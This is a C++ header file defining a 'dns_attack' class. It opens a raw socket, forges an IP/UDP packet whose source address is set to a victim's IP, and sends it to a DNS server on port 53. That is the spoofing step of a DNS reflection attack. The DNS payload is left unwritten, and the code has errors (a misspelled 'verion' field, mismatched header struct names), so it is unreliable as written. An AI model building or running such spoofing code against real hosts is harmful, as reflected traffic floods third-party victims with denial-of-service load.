#ifndef DNS_ATTACK
#define DNS_ATTACK

#include "misc.h"
#include <string>
#include <iostream>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

class dns_attack {
private:
	std::string Victim_IP, Server_IP;
	int Source_Port;
public:
	void attack();
	dns_attack();
	dns_attack(std::string Victim_IP, int Source_Port, std::string Server_IP) : Victim_IP(Victim_IP), Source_Port(Source_Port), Server_IP(Server_IP) {};
};


dns_attack::dns_attack() {
	Source_Port = 0;
	Victim_IP = "";
	Server_IP = "";
}

void dns_attack::attack() {
	int sockfd = Socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	{
		std::cout << "Set up socket option........." << std::endl;
		int one = 1;
		Setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int));
		std::cout << "Success!" << std::endl;
	}

	char buffer[16384];
	memset(buffer, 0, sizeof(buffer));

	struct iphdr *ip = (struct iphdr *) buffer;
	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));

	ip->ihl = 5;
	ip->verion = 4;
	ip->tos = 16; // Low delay
	ip->tot_len = sizeof(struct ipheader) + sizeof(struct udpheader); // Add the size of DNS payload later.
	ip->id = htons(30678);
	ip->ttl = 64; // hops
	ip->protocol = 17; // UDP
	ip->saddr = inet_addr(Victim_IP.c_str());
	ip->daddr = inet_addr(Server_IP.c_str());

	udp->source = htons(Source_Port);
	udp->dest = htons(53); // dns port number
	udp->len = htons(sizeof(struct udphdr)); //

	ip->check = getCheckSum(buffer, sizeof(struct iphdr) + sizeof(struct udphdr));

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(53);
	sin.sin_addr.s_addr = inet_addr(Server_IP.c_str());

	if (sendto(sockfd, buffer, ip->tot_len, 0,
	(struct sockaddr *)&sin, sizeof(sin)) < 0)
	{
		perror("sendto()");
		exit(3);
	}
	printf("OK: one packet is sent.\n");


	Close(sockfd);
}


#endif
